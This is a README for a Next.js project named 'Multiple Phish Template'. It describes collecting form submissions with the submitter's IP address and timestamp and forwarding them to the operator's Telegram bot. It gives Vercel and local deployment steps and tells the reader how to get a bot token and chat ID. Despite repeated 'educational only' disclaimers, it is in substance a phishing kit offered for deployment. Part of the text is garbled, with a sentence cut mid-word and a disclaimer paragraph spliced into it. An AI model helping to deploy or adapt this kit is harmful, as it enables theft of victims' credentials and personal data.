# Multiple Phish Template 

**⚠️ EDUCATIONAL PROJECT DISCLAIMER**

This project is created for **EDUCATIONAL PURPOSES ONLY** by **ASRBD**. The author does not endorse or encourage any malicious use of this code. Use responsibly and ethically. This template is intended to teach developers about web application architecture and security concepts.

This template demonstrates how to collect form data and send it to a Telegram bot through a Next.js application. It's designed as a learning tool for understanding:
- Next.js API routes and backend integration
- Form handling in React applications
- Integration with external APIs (Telegram Bot API)
- Centralized configuration management
- Environment variable configuration for deployments

## Features

- Multiple form collection endpoints
- Centralized Telegram bot configuration
- Responsive UI components
- IP and timestamp tracking
- Error handling

## Configuration

### Environment Variables

This project requires environment variables to function properly. Create a `.env.local` file in the root directory with the following configuration:

```env
# Telegram Bot Configuration
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
NEXT_PUBLIC_TELEGRAM_CHAT_ID=your_telegram_chat_id_here

# Optional: Additional configurations
NEXT_PUBLIC_API_URL=http://localhost:3000
NEXT_PUBLIC_APP_NAME=Phish Template
```

**Note**: Prefix variables with `NEXT_PUBLIC_` only if they need to be accessible in the browser. Sensitive tokens should not have this prefix.

### Getting Your Telegram Credentials

1. **Telegram Bot Token**: Contact [@BotFather](https://t.me/BotFather) on Telegram
2. **Telegram Chat ID**: Send a message to your bot and visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` to find your chat ID

See the `.env.example` file for reference.

## Deployment on Vercel (Recommended)

The easiest way to deploy this project is using Vercel:

1. **Create a Vercel Account**: Sign up at [vercel.com](https://vercel.com) if you don't have an account

2. **Connect Your GitHub Repository**:
   - Fork this template to your GitHub account
   - In Vercel dashboard, click "New Project"
   - Select your repository from the list
   - Vercel will detect Next.js automatically

3. **Configure Environment Variables**:
   - In the Vercel project settings, go to **Settings** → **Environment Variables**
   - Add the following variables:
     - `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` - Your Telegram bot token
     - `NEXT_PUBLIC_TELEGRAM_CHAT_ID` - Your Telegram chat ID
   - Each environment can have different values (Production, Preview, Development)

4. **Deploy**:
   - Keep the default build settings
   - Click "Deploy"

Your project will be live at `https://your-project-name.vercel.app`

**Important**: Never commit `.env.local` to version control. Use Vercel's environment variable settings instead.

### Security Note
This project uses Next.js 16.2.4 which is the latest stable version with all security patches. Ensure your dependencies are up to date by running `npm install`.

## Deployment on Your Own Machine

First, clone the repository:

```bash
git clone https://github.com/asrbd-army/phish-template.git
cd phish-template
```

Install dependencies:

```bash
npm install
# or
yarn install
```

Run the development server:

```bash
npm run dev
# or
yarn dev
```

Open [http://localhost:3000](http://localhost:3000) to see the result.

## How It Works

1. User submits form data
2. Next.js API route processes the submission
3. Data is formatted with IP address and timestamp
4. Formatted message is sent to your Telegram bot
5. User receives a success response

## Customization

You can easily customize:
- Form fields and validation
- UI design and components
- Message format sent to Telegram
- Success/error responses

## Educational Resources

To learn more about the tec**educational purposes only** by **ASRBD**. By using this code, you agree to:
- Use it responsibly and legally
- Not engage in any malicious activities
- Respect user privacy and consent
- Follow all applicable laws and regulations

Unauthorized access to computer systems is illegal. Use this code only on systems you own or have explicit permission to use.

## Created By

**ASRBD** - Educational Technology Developer

For more information about this educational project, please visit our documentation or contact us direct

- [Next.js Documentation](https://nextjs.org/docs)
- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
- [React Forms Guide](https://reactjs.org/docs/forms.html)

## License

This project is shared for educational purposes only. By using this code, you agree to use it responsibly and legally.

## Disclaimer

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. The author takes no responsibility for any misuse of this software. This project should be used only for learning and understanding web technologies in an ethical manner.

## Credit
- [ASRBD](https://asrbd.pages.dev)
